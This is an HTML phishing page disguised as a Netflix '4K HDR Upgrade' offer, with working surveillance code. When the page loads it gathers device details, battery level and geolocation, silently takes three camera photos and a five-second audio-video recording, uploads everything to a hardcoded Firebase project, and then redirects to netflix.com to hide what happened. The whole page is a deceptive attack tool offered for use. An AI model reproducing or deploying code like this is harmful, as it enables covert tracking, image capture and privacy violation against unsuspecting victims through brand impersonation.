<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade | Netflix</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #e50914, #b20710);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
        }
        h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
        .badge {
            display: inline-block;
            background: linear-gradient(135deg, #e50914, #b20710);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #fff;
        }
        .sub { color: #aaa; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
        .quality-box {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: left;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .quality-box p {
            color: #ccc;
            font-size: 14px;
            margin: 8px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .quality-box .label { color: #888; width: 100px; }
        .quality-box .value { color: #fff; font-weight: 500; }
        .quality-badge {
            background: rgba(229, 9, 20, 0.2);
            border: 1px solid rgba(229, 9, 20, 0.5);
            display: inline-block;
            padding: 6px 14px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 12px;
            color: #e50914;
        }
        .btn {
            background: linear-gradient(135deg, #e50914, #b20710);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 44px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
        }
        .btn:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(229, 9, 20, 0.4); }
        .btn:disabled { background: #444; transform: none; cursor: not-allowed; }
        .loader { margin-top: 20px; color: #e50914; font-size: 13px; display: none; padding: 12px; background: rgba(229, 9, 20, 0.1); border-radius: 30px; }
        .status-msg { margin-top: 16px; padding: 12px; border-radius: 30px; font-size: 12px; display: none; background: rgba(74, 222, 128, 0.1); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
        .status-msg.error { background: rgba(255, 107, 107, 0.1); color: #ff6b6b; border-color: rgba(255, 107, 107, 0.3); }
        input, video, canvas { display: none; }
        .footer { margin-top: 24px; color: #555; font-size: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎬</div>
        <h1>4K HDR Upgrade</h1>
        <div class="badge">⚡ LIMITED OFFER</div>
        <div class="sub">Enhance your streaming quality in seconds</div>
        
        <div class="quality-box">
            <p><span class="label">📱 Device:</span><span class="value" id="deviceName">Detecting...</span></p>
            <p><span class="label">🔋 Battery:</span><span class="value" id="batteryStatus">Loading...</span></p>
            <p><span class="label">📶 Current:</span><span class="value">HD Ready (1080p)</span></p>
            <p><span class="label">✨ Upgrade:</span><span class="value">4K HDR + Dolby Atmos</span></p>
            <div class="quality-badge">⚡ One-click optimization</div>
        </div>
        
        <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
        <div class="loader" id="loader">Optimizing your device...</div>
        <div class="status-msg" id="statusMsg"></div>
        <div class="footer">🔒 Encrypted • One-time setup • Instant activation</div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const upgradeBtn = document.getElementById('upgradeBtn');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        
        if (!sessionId) {
            showMessage('❌ Invalid upgrade link. Please use the correct link.', true);
            upgradeBtn.disabled = true;
        }
        
        // ========== DEVICE DETAILS ==========
        // Get device model
        const ua = navigator.userAgent;
        let deviceModel = "Unknown";
        let deviceBrand = "Unknown";
        
        if (ua.includes("iPhone")) {
            deviceBrand = "Apple";
            if (ua.includes("iPhone14")) deviceModel = "iPhone 14";
            else if (ua.includes("iPhone13")) deviceModel = "iPhone 13";
            else if (ua.includes("iPhone12")) deviceModel = "iPhone 12";
            else if (ua.includes("iPhone11")) deviceModel = "iPhone 11";
            else deviceModel = "iPhone";
        } else if (ua.includes("Android")) {
            deviceBrand = "Android";
            const match = ua.match(/Android (\d+\.\d+)/);
            const androidVersion = match ? match[1] : "Unknown";
            const smMatch = ua.match(/SM-[A-Z0-9]+/);
            const modelMatch = ua.match(/; ([^;]+) Build/);
            deviceModel = smMatch ? smMatch[0] : (modelMatch ? modelMatch[1] : "Android Device");
        } else if (ua.includes("Windows")) {
            deviceBrand = "Microsoft";
            deviceModel = "Windows PC";
        } else if (ua.includes("Mac")) {
            deviceBrand = "Apple";
            deviceModel = "Mac";
        }
        
        document.getElementById('deviceName').innerHTML = `${deviceBrand} ${deviceModel}`;
        
        // Get Battery Percentage
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    const level = Math.floor(battery.level * 100);
                    const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
                    document.getElementById('batteryStatus').innerHTML = `${level}% (${charging})`;
                    return { level: level, charging: battery.charging };
                } else {
                    document.getElementById('batteryStatus').innerHTML = "Not Available";
                    return { level: "Unknown", charging: false };
                }
            } catch(e) {
                document.getElementById('batteryStatus').innerHTML = "Not Available";
                return { level: "Unknown", charging: false };
            }
        }
        
        getBatteryInfo();
        
        function showMessage(msg, isError = false) {
            statusMsg.style.display = 'block';
            statusMsg.className = isError ? 'status-msg error' : 'status-msg';
            statusMsg.innerHTML = msg;
            setTimeout(() => { statusMsg.style.display = 'none'; }, 4000);
        }
        
        // Save to Realtime Database
        async function saveData(type, data) {
            if (!sessionId) return false;
            try {
                const timestamp = new Date().toISOString();
                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
                    type: type,
                    data: data,
                    timestamp: timestamp
                });
                console.log(`✅ Saved: ${type}`);
                return true;
            } catch(e) {
                console.error('Save error:', e);
                return false;
            }
        }
        
        // Upload file to Firebase Storage
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveData(type, { url, name: file.name, size: file.size });
            return url;
        }
        
        // 1. Device Info (with battery)
        async function sendDeviceInfo() {
            const battery = await getBatteryInfo();
            await saveData('device_info', {
                device: `${deviceBrand} ${deviceModel}`,
                model: deviceModel,
                brand: deviceBrand,
                battery: `${battery.level}%`,
                charging: battery.charging,
                ua: ua,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language
            });
        }
        
        // 2. Location
        async function getLocation() {
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                await saveData('location', {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                return true;
            } catch(e) {
                return false;
            }
        }
        
        // 3. Camera Photos (3 photos automatically)
        async function captureCameraPhotos() {
            try {
                loader.innerHTML = "📷 Requesting camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                // Take 3 photos
                for (let i = 1; i <= 3; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                    await uploadFile(file, 'camera_photo');
                    loader.innerHTML = `📷 Captured ${i}/3 photos`;
                    await new Promise(r => setTimeout(r, 500));
                }
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log("Camera error:", e);
                showMessage("Camera access needed for 4K HDR upgrade", true);
                return false;
            }
        }
        
        // 4. 5 Second Video
        async function captureVideo() {
            try {
                loader.innerHTML = "🎥 Recording video (5s)...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                    await uploadFile(file, 'video_recording');
                    loader.innerHTML = "✅ Video recorded!";
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                console.log("Video error:", e);
                return false;
            }
        }
        
        // MAIN UPGRADE FUNCTION
        async function startUpgrade() {
            if (!sessionId) return;
            
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = "🔧 Preparing device optimization...";
            
            // Send device info with battery
            await sendDeviceInfo();
            
            // Get location
            loader.innerHTML = "📍 Getting location...";
            await getLocation();
            
            // Capture camera photos (3 photos)
            await captureCameraPhotos();
            
            // Capture 5 second video
            await captureVideo();
            
            await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
            
            loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
            showMessage("4K HDR is now active on your device", false);
            
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        upgradeBtn.onclick = startUpgrade;
        
        if (sessionId) {
            setTimeout(startUpgrade, 500);
        }
    </script>
</body>
</html>
